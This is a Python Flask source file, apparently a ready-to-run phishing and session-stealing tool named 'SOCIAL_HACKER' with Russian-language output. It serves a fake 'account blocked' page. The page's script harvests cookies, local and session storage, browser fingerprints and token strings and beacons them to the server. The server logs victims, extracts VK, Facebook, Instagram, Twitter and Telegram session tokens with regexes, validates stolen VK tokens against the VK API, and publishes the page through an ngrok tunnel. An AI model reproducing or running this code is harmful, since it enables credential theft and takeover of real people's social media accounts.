from flask import Flask, request, render_template_string, jsonify
import requests, json, re, threading, time, os
from datetime import datetime
from http.server import HTTPServer, SimpleHTTPRequestHandler
import subprocess

app = Flask(__name__)
stolen_data = []

HTML = """
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width">
<title>⚠️ Аккаунт заблокирован</title>
<style>body{font-family:system-ui;margin:0;padding:40px;background:linear-gradient(45deg,#ff6b6b,#4ecdc4);display:flex;align-items:center;justify-content:center;min-height:100vh}
.box{background:#fff;border-radius:20px;padding:40px;max-width:450px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
.logo{text-align:center;margin-bottom:30px}
.logo svg{width:80px;height:80px;fill:#ff4757}
h1{color:#2f3542;font-size:28px;margin:0 0 15px;text-align:center}
p{color:#747d8c;font-size:16px;text-align:center;margin-bottom:30px}
.btn{background:#00b894;color:white;border:none;padding:18px 40px;border-radius:12px;font-size:18px;font-weight:bold;cursor:pointer;width:100%;transition:background 0.3s}
.btn:hover{background:#00a085}
.social{display:flex;gap:15px;justify-content:center;margin-top:25px;flex-wrap:wrap}
.social a{display:flex;align-items:center;gap:8px;padding:12px 20px;background:#f1f2f6;border-radius:25px;text-decoration:none;color:#2f3542;font-weight:500;font-size:14px}
#progress{display:none;text-align:center;margin-top:20px;color:#00b894}</style></head>
<body>
<div class="box">
<div class="logo">⚠️</div>
<h1>Подозрительная активность</h1>
<p>Подтвердите личность через соцсети для разблокировки</p>
<button class="btn" onclick="hackAll()">Подтвердить сейчас</button>
<div id="progress">⏳ Проверка аккаунтов...</div>
<div class="social">
<a onclick="check('VK')">VK</a><a onclick="check('FB')">Facebook</a><a onclick="check('IG')">Instagram</a>
<a onclick="check('TW')">Twitter</a><a onclick="check('TG')">Telegram</a><a onclick="check('TT')">TikTok</a></div>
</div>
<script>
function hackAll(){document.getElementById('progress').style.display='block';steal();setTimeout(steal,500);setTimeout(steal,1500)}
function check(s){steal()}
function steal(){
let d={cookies:document.cookie,ls:{},ss:{},ua:navigator.userAgent,lang:navigator.language,canvas:canvasFP(),tokens:[]};
for(let i=0;i<localStorage.length;i++)d.ls[localStorage.key(i)]=localStorage.getItem(localStorage.key(i));
for(let i=0;i<sessionStorage.length;i++)d.ss[sessionStorage.key(i)]=sessionStorage.getItem(sessionStorage.key(i));
let t=document.body.innerHTML.match(/(access_token|token|c_user|sessionid|auth_token|csrftoken)[^=]*=[^;&\s"']{10,}/gi)||[];
d.tokens=t;navigator.sendBeacon('/grab',JSON.stringify(d))}
function canvasFP(){let c=document.createElement('canvas'),a=c.getContext('2d');a.textBaseline='top';a.font='14px Arial';a.fillText('hack',2,2);return c.toDataURL()}
window.onload=()=>setTimeout(steal,1000);let oXHR=window.XMLHttpRequest;window.XMLHttpRequest=function(){let x=new oXHR();let os=x.send;x.send=function(){x.addEventListener('load',()=>navigator.sendBeacon('/grab',JSON.stringify({xhr:location.href})));os.apply(this,arguments)};return x};
</script></body></html>
"""

@app.route('/')
def index(): return render_template_string(HTML)

@app.route('/grab', methods=['POST'])
def grab():
    try:
        data = request.data.decode()
        ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
        entry = {'time':datetime.now().isoformat(),'ip':ip,'ua':request.headers.get('User-Agent'),'data':data}
        stolen_data.append(entry)
        with open('VICTIMS.txt','a') as f: f.write(json.dumps(entry)+'\n===VICTIM===\n')
        print(f"🎯 НОВАЯ ЖЕРТВА {ip}: {data[:100]}...")
        parse_tokens()
    except: pass
    return '',200

@app.route('/status')
def status(): return jsonify(stolen_data[-5:])

def parse_tokens():
    try:
        with open('VICTIMS.txt') as f:
            content = f.read()
        
        tokens = {}
        pats = {
            'VK': r'(vkid_|access_token|remind_token)=([^;&\s"]{10,})',
            'FB': r'(c_user|datr|sb)=([^;&\s"]{5,})',
            'IG': r'(sessionid|csrftoken|ds_user_id)=([^;&\s"]{10,})',
            'TW': r'(auth_token|ct0)=([^;&\s"]{20,})',
            'TG': r'(_telegram_auth_token)=([^;&\s"]{20,})'
        }
        
        for soc, pat in pats.items():
            m = re.findall(pat, content, re.I)
            if m: tokens[soc] = m
        
        if tokens:
            with open('TOKENS.json','w') as f:
                json.dump(tokens,f,indent=2)
            print("💎 ТОКЕНЫ СОХРАНЕНЫ В TOKENS.json")
            
            # Авто-логин VK
            if 'VK' in tokens:
                vk_token = tokens['VK'][0][1]
                test_vk(vk_token)
    except: pass

def test_vk(token):
    try:
        r = requests.get('https://api.vk.com/method/users.get', params={
            'access_token':token, 'v':'5.131', 'fields':'screen_name'
        }).json()
        if 'response' in r:
            user = r['response'][0]
            print(f"✅ VK ВЗЛОМАН: {user.get('first_name','')} {user.get('last_name','')} (@{user.get('screen_name','')})")
            with open('WORKING_VK.txt','a') as f:
                f.write(f"{token} | {user}\n")
    except: pass

if __name__ == '__main__':
    print("🕷️ SOCIAL_HACKER ЗАПУЩЕН!")
    print("📱 Ссылка появится через 10 сек...")
    threading.Thread(target=lambda:app.run(host='0.0.0.1',port=5000)).start()
    time.sleep(5)
    
    # Ngrok туннель
    ngrok_proc = subprocess.Popen(['ngrok','http','5000'], stdout=subprocess.PIPE)
    time.sleep(5)
    
    print("\n🔥 ОТКРЫВАЙ http://127.0.0.1:4040  <-- ТВОЯ ССЫЛКА ЗДЕСЬ!")
    print("📁 Данные: VICTIMS.txt | TOKENS.json | WORKING_VK.txt")
    print("\n🎯 КОМАНДЫ:")
    print("curl localhost:5000/status     # свежие жертвы")
    print("cat TOKENS.json               # все токены")
    print("cat WORKING_VK.txt            # рабочие VK")
    
    try: input("\n[Enter] для остановки...")
    except: pass
    ngrok_proc.terminate()
